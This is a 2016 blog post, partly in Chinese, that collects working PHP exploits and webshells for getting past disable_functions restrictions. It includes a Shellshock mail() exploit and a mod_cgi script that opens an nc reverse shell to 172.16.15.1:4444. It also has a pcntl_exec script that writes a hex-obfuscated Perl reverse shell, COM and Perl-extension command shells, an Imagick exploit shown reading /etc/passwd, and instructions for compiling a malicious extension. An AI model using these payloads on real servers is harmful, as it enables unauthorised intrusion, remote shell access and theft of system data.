---
layout:     post
title:      "php disabled_functions bypass"
subtitle:   "bypass"
date:       2016-12-23
author:     "Urahara"
header-img: "img/1036d061984b77d4087f5fd93fc79881.jpg"
header-mask: 0.3
tags:
    - php
    - bypass
    - webshell


---

### PHP 5.x Shellshock Exploit

```
# Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions)
# CVE: CVE-2014-6271
<pre>
<?php echo "Disabled functions: ".ini_get('disable_functions')."\n"; ?>
<?php
function shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283
   if(strstr(readlink("/bin/sh"), "bash") != FALSE) {
     $tmp = tempnam(".","data");
     putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
     // In Safe Mode, the user may only alter environment variables whose names
     // begin with the prefixes supplied by this directive.
     // By default, users will only be able to set environment variables that
     // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive is empty,
     // PHP will let the user modify ANY environment variable!
     mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actually send any mail
   }
   else return "Not vuln (not bash)";
   $output = @file_get_contents($tmp);
   @unlink($tmp);
   if($output != "") return $output;
   else return "No output, or not vuln.";
}
echo shellshock($_REQUEST["cmd"]);
?>
```

### mod_cgi

```
<?php
// Only working with mod_cgi, writable dir and htaccess files enabled
$cmd = "nc -c '/bin/bash' 172.16.15.1 4444"; //command to be executed
$shellfile = "#!/bin/bash\n"; //using a shellscript
$shellfile .= "echo -ne \"Content-Type: text/html\\n\\n\"\n"; //header is needed, otherwise a 500 error is thrown when there is output
$shellfile .= "$cmd"; //executing $cmd
function checkEnabled($text,$condition,$yes,$no) //this surely can be shorter
{
	echo "$text: " . ($condition ? $yes : $no) . "<br>\n";
}
if (!isset($_GET['checked']))
{
	@file_put_contents('.htaccess', "\nSetEnv HTACCESS on", FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed
	header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); //execute the script again to see if the htaccess test worked
}
else
{
	$modcgi = in_array('mod_cgi', apache_get_modules()); // mod_cgi enabled?
	$writable = is_writable('.'); //current dir writable?
	$htaccess = !empty($_SERVER['HTACCESS']); //htaccess enabled?
		checkEnabled("Mod-Cgi enabled",$modcgi,"Yes","No");
		checkEnabled("Is writable",$writable,"Yes","No");
		checkEnabled("htaccess working",$htaccess,"Yes","No");
	if(!($modcgi && $writable && $htaccess))
	{
		echo "Error. All of the above must be true for the script to work!"; //abort if not
	}
	else
	{
		checkEnabled("Backing up .htaccess",copy(".htaccess",".htaccess.bak"),"Suceeded! Saved in .htaccess.bak","Failed!"); //make a backup, cause you never know.
		checkEnabled("Write .htaccess file",file_put_contents('.htaccess',"Options +ExecCGI\nAddHandler cgi-script .dizzle"),"Succeeded!","Failed!"); //.dizzle is a nice extension
		checkEnabled("Write shell file",file_put_contents('shell.dizzle',$shellfile),"Succeeded!","Failed!"); //write the file
		checkEnabled("Chmod 777",chmod("shell.dizzle",0777),"Succeeded!","Failed!"); //rwx
		echo "Executing the script now. Check your listener <img src = 'shell.dizzle' style = 'display:none;'>"; //call the script
	}
}
?>
```

### pcntl_exec 

PHP 4 >= 4.2.0, PHP 5 on linux

```
#/tmp/hack.sh
#!/bin/bash
ls -l /

#exec.php
<?php pcntl_exec(“/bin/bash”, array(“/tmp/hack.sh”));?>
```

```
<?php
$cmd = @$_REQUEST[cmd];
if(function_exists('pcntl_exec')) {
    $cmd = $cmd."&pkill -9 bash >out";
    pcntl_exec("/bin/bash", $cmd);
    echo file_get_contents("out");        
} else {
        echo '不支持pcntl扩展';
}
?>
```

```
<?php 
/*******************************
 *查看phpinfo编译参数--enable-pcntl
 *作者 Spider
 *nc -vvlp 443
********************************/
 
$ip = 'xxx.xxx.xxx.xxx';
$port = '443';
$file = '/tmp/bc.pl';
 
header("content-Type: text/html; charset=gb2312");
 
if(function_exists('pcntl_exec')) {
        $data = "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x20\x2d\x77\x0d\x0a\x23\x0d\x0a".
                "\x0d\x0a\x75\x73\x65\x20\x73\x74\x72\x69\x63\x74\x3b\x20\x20\x20\x20\x0d\x0a\x75\x73\x65\x20".
                "\x53\x6f\x63\x6b\x65\x74\x3b\x0d\x0a\x75\x73\x65\x20\x49\x4f\x3a\x3a\x48\x61\x6e\x64\x6c\x65".
                "\x3b\x0d\x0a\x0d\x0a\x6d\x79\x20\x24\x72\x65\x6d\x6f\x74\x65\x5f\x69\x70\x20\x3d\x20\x27".$ip.
                "\x27\x3b\x0d\x0a\x6d\x79\x20\x24\x72\x65\x6d\x6f\x74\x65\x5f\x70\x6f\x72\x74\x20\x3d\x20\x27".$port.
                "\x27\x3b\x0d\x0a\x0d\x0a\x6d\x79\x20\x24\x70\x72\x6f\x74\x6f\x20\x3d\x20\x67\x65\x74\x70\x72".
                "\x6f\x74\x6f\x62\x79\x6e\x61\x6d\x65\x28\x22\x74\x63\x70\x22\x29\x3b\x0d\x0a\x6d\x79\x20\x24".
                "\x70\x61\x63\x6b\x5f\x61\x64\x64\x72\x20\x3d\x20\x73\x6f\x63\x6b\x61\x64\x64\x72\x5f\x69\x6e".
                "\x28\x24\x72\x65\x6d\x6f\x74\x65\x5f\x70\x6f\x72\x74\x2c\x20\x69\x6e\x65\x74\x5f\x61\x74\x6f".
                "\x6e\x28\x24\x72\x65\x6d\x6f\x74\x65\x5f\x69\x70\x29\x29\x3b\x0d\x0a\x6d\x79\x20\x24\x73\x68".
                "\x65\x6c\x6c\x20\x3d\x20\x27\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69\x27\x3b\x0d\x0a\x73\x6f".
                "\x63\x6b\x65\x74\x28\x53\x4f\x43\x4b\x2c\x20\x41\x46\x5f\x49\x4e\x45\x54\x2c\x20\x53\x4f\x43".
                "\x4b\x5f\x53\x54\x52\x45\x41\x4d\x2c\x20\x24\x70\x72\x6f\x74\x6f\x29\x3b\x0d\x0a\x53\x54\x44".
                "\x4f\x55\x54\x2d\x3e\x61\x75\x74\x6f\x66\x6c\x75\x73\x68\x28\x31\x29\x3b\x0d\x0a\x53\x4f\x43".
                "\x4b\x2d\x3e\x61\x75\x74\x6f\x66\x6c\x75\x73\x68\x28\x31\x29\x3b\x0d\x0a\x63\x6f\x6e\x6e\x65".
                "\x63\x74\x28\x53\x4f\x43\x4b\x2c\x24\x70\x61\x63\x6b\x5f\x61\x64\x64\x72\x29\x20\x6f\x72\x20".
                "\x64\x69\x65\x20\x22\x63\x61\x6e\x20\x6e\x6f\x74\x20\x63\x6f\x6e\x6e\x65\x63\x74\x3a\x24\x21".
                "\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x49\x4e\x2c\x20\x22\x3c\x26\x53\x4f\x43\x4b".
                "\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x4f\x55\x54\x2c\x20\x22\x3e\x26\x53\x4f\x43".
                "\x4b\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x45\x52\x52\x2c\x20\x22\x3e\x26\x53\x4f".
                "\x43\x4b\x22\x3b\x0d\x0a\x73\x79\x73\x74\x65\x6d\x28\x24\x73\x68\x65\x6c\x6c\x29\x3b\x0d\x0a".
                "\x63\x6c\x6f\x73\x65\x20\x53\x4f\x43\x4b\x3b\x0d\x0a\x65\x78\x69\x74\x20\x30\x3b\x0a";
        $fp = fopen($file,'w');
        $key = fputs($fp,$data);
        fclose($fp);
        if(!$key) exit('写入'.$file.'失败');
        chmod($file,0777);
        pcntl_exec($file);
        unlink($file);
} else {
        echo '不支持pcntl扩展';
}
?>
```

### windows system components

```
<?php

$command=$_POST[a];

$wsh = new COM('WScript.shell');   // 生成一个COM对象

$exec = $wsh->exec('cmd.exe /c '.$command); //调用对象方法来执行命令

$stdout = $exec-&gt;StdOut();

$stroutput = $stdout->ReadAll();

echo $stroutput

?>
```

### PHP Perl Extension Safe_mode Bypass Exploit

```
<?php
 
##########################################################
###----------------------------------------------------###
###----PHP Perl Extension Safe_mode Bypass Exploit-----###
###----------------------------------------------------###
###-Author:--NetJackal---------------------------------###
###-Email:---nima_501[at]yahoo[dot]com-----------------###
###-Website:-http://netjackal.by.ru--------------------###
###----------------------------------------------------###
##########################################################
 
if(!extension_loaded('perl'))die('perl extension is not loaded');
if(!isset($_GET))$_GET=&$HTTP_GET_VARS;
if(empty($_GET['cmd']))$_GET['cmd']=(strtoupper(substr(PHP_OS,0,3))=='WIN')?'dir':'ls';
$perl=new perl();
echo "<textarea rows='25' cols='75'>";
$perl->eval("system('".$_GET['cmd']."')");
echo "&lt;/textarea&gt;";
$_GET['cmd']=htmlspecialchars($_GET['cmd']);
echo "<br><form>CMD: <input type=text name=cmd value='".$_GET['cmd']."' size=25></form>"
 
?>
```

### Imagick  <= 3.3.0 PHP >= 5.4 Exploit

```
# Exploit Title: PHP Imagick disable_functions Bypass
# Date: 2016-05-04
# Exploit Author: RicterZ (ricter@chaitin.com)
# Vendor Homepage: https://pecl.php.net/package/imagick
# Version: Imagick  <= 3.3.0 PHP >= 5.4
# Test on: Ubuntu 12.04
# Exploit:
<?php
# PHP Imagick disable_functions Bypass
# Author: Ricter <ricter@chaitin.com>
#
# $ curl "127.0.0.1:8080/exploit.php?cmd=cat%20/etc/passwd"
# <pre>
# Disable functions: exec,passthru,shell_exec,system,popen
# Run command: cat /etc/passwd
# ====================
# root:x:0:0:root:/root:/usr/local/bin/fish
# daemon:x:1:1:daemon:/usr/sbin:/bin/sh
# bin:x:2:2:bin:/bin:/bin/sh
# sys:x:3:3:sys:/dev:/bin/sh
# sync:x:4:65534:sync:/bin:/bin/sync
# games:x:5:60:games:/usr/games:/bin/sh
# ...
# </pre>
echo "Disable functions: " . ini_get("disable_functions") . "\n";
$command = isset($_GET['cmd']) ? $_GET['cmd'] : 'id';
echo "Run command: $command\n====================\n";
 
$data_file = tempnam('/tmp', 'img');
$imagick_file = tempnam('/tmp', 'img');
 
$exploit = <<<EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/image.jpg"|$command>$data_file")'
pop graphic-context
EOF;
 
file_put_contents("$imagick_file", $exploit);
$thumb = new Imagick();
$thumb->readImage("$imagick_file");
$thumb->writeImage(tempnam('/tmp', 'img'));
$thumb->clear();
$thumb->destroy();
 
echo file_get_contents($data_file);
?>
```

### 拓展库绕过

获取php版本号，并下载下载相同或相近版本的php源码包

```
tar zxvf php-5.3.10.tar.gz  //解压缩
cd php-5.3.10/ext       
./ext_skel --extname=dl  //生成名为dl的拓展库 
cd dl
vi config.m4
```

删除以下三行前面的dnl并保存

```
PHP_ARG_WITH(dl, for dl support,
Make sure that the comment is aligned: 
[  --with-dl             Include dl support])
```

运行phpize

```
whereis phpize          //找出phpize路径
/usr/local/bin/phpize     // 运行phpize
vi dl.c
```

添加system(arg);

```
if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "s", &amp;arg, &amp;arg_len) == FAILURE) {
	return;
}
system(arg); //add this
```

编译

```
whereis php-config  //找出php-config的路径
./configure --whith-php-config=php-config路径
make 
make install
[root@TENCENT64 ~/php-5.3.10/ext/dl]# make install
Installing shared extensions:     /usr/local/lib/php/extensions/no-debug-non-zts-20121212/
```

将生成文件上传至extension_dir目录下，若extension_dir目录无写权限则可写入任意目录用../../来绕过并调用。

```
<?php
dl("dl.so");  //dl.so在extension_dir目录，如不在则用../../来实现调用
confirm_dl_compiled("$_GET[a]&gt;1.txt");
?>
```

查看1.txt即可看到命令执行结果

#### Referer

[http://www.91ri.org/8700.html](http://www.91ri.org/8700.html)

[https://www.exploit-db.com/exploits/35146/](https://www.exploit-db.com/exploits/35146/)

[https://blog.asdizzle.com/index.php/2016/05/02/getting-shell-access-with-php-system-functions-disabled/](https://blog.asdizzle.com/index.php/2016/05/02/getting-shell-access-with-php-system-functions-disabled/)

[https://www.t00ls.net/viewthread.php?tid=28086](https://www.t00ls.net/viewthread.php?tid=28086)



